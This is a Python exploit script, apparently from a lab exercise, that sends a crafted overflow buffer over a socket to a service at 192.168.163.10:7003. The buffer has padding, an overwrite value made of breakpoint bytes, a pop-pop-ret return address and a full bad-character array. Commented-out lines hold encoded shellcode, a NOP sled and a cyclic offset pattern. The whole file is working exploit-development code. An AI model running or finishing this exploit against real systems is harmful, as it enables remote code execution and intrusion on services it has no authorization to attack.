#!/usr/bin/python
import socket, time, sys

try:
    

    print("\nSending Evil Buffer...")
    badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
    # nop_sled = "\x90" * 12

    # shellcode =  b""
    # shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
    # shellcode += b"\x5e\x81\x76\x0e\xc5\x25\x26\xa9\x83\xee\xfc"
    # shellcode += b"\xe2\xf4\x39\xcd\xa4\xa9\xc5\x25\x46\x20\x20"
    # shellcode += b"\x14\xe6\xcd\x4e\x75\x16\x22\x97\x29\xad\xfb"
    # shellcode += b"\xd1\xae\x54\x81\xca\x92\x6c\x8f\xf4\xda\x8a"
    # shellcode += b"\x95\xa4\x59\x24\x85\xe5\xe4\xe9\xa4\xc4\xe2"
    # shellcode += b"\xc4\x5b\x97\x72\xad\xfb\xd5\xae\x6c\x95\x4e"
    # shellcode += b"\x69\x37\xd1\x26\x6d\x27\x78\x94\xae\x7f\x89"
    # shellcode += b"\xc4\xf6\xad\xe0\xdd\xc6\x1c\xe0\x4e\x11\xad"
    # shellcode += b"\xa8\x13\x14\xd9\x05\x04\xea\x2b\xa8\x02\x1d"
    # shellcode += b"\xc6\xdc\x33\x26\x5b\x51\xfe\x58\x02\xdc\x21"
    # shellcode += b"\x7d\xad\xf1\xe1\x24\xf5\xcf\x4e\x29\x6d\x22"
    # shellcode += b"\x9d\x39\x27\x7a\x4e\x21\xad\xa8\x15\xac\x62"
    # shellcode += b"\x8d\xe1\x7e\x7d\xc8\x9c\x7f\x77\x56\x25\x7a"
    # shellcode += b"\x79\xf3\x4e\x37\xcd\x24\x98\x4d\x15\x9b\xc5"
    # shellcode += b"\x25\x4e\xde\xb6\x17\x79\xfd\xad\x69\x51\x8f"
    # shellcode += b"\xc2\xda\xf3\x11\x55\x24\x26\xa9\xec\xe1\x72"
    # shellcode += b"\xf9\xad\x0c\xa6\xc2\xc5\xda\xf3\xf9\x95\x75"
    # shellcode += b"\x76\xe9\x95\x65\x76\xc1\x2f\x2a\xf9\x49\x3a"
    # shellcode += b"\xf0\xb1\xc3\xc0\x4d\xe6\x01\xb2\x86\x4e\xab"
    # shellcode += b"\xc5\x34\x7d\x20\x23\x4f\x36\xff\x92\x4d\xbf"
    # shellcode += b"\x0c\xb1\x44\xd9\x7c\x40\xe5\x52\xa5\x3a\x6b"
    # shellcode += b"\x2e\xdc\x29\x4d\xd6\x1c\x67\x73\xd9\x7c\xad"
    # shellcode += b"\x46\x4b\xcd\xc5\xac\xc5\xfe\x92\x72\x17\x5f"
    # shellcode += b"\xaf\x37\x7f\xff\x27\xd8\x40\x6e\x81\x01\x1a"
    # shellcode += b"\xa8\xc4\xa8\x62\x8d\xd5\xe3\x26\xed\x91\x75"
    # shellcode += b"\x70\xff\x93\x63\x70\xe7\x93\x73\x75\xff\xad"
    # shellcode += b"\x5c\xea\x96\x43\xda\xf3\x20\x25\x6b\x70\xef"
    # shellcode += b"\x3a\x15\x4e\xa1\x42\x38\x46\x56\x10\x9e\xd6"
    # shellcode += b"\x1c\x67\x73\x4e\x0f\x50\x98\xbb\x56\x10\x19"
    # shellcode += b"\x20\xd5\xcf\xa5\xdd\x49\xb0\x20\x9d\xee\xd6"
    # shellcode += b"\x57\x49\xc3\xc5\x76\xd9\x7c"

    padding = "A" *  2152#(2080 - len(nop_sled) - len(shellcode))
    #eip = "\xcf\x10\x80\x14"
    eip = "\xCC" * 4#"\x3d\x11\x80\x14"
    offset = "C" * 4
    ppr = "\x51\x78\x80\x14"
    #first_stage = "\xff\xe1\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buffer = "\xCC" * (2700 - len(padding) - len(eip) - len(offset))

    #inputBuffer = nop_sled + shellcode + padding + eip + first_stage 
    inputBuffer = badchars + padding + eip + ppr#offset + buffer
    #inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
    #print(inputBuffer)
    
    buffer = inputBuffer

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.163.10', 7003))
    s.send(inputBuffer)

    s.close()
    print("\nDone!")

except Exception as e: 
    print(e)
    print("Could not connect!")
    sys.exit()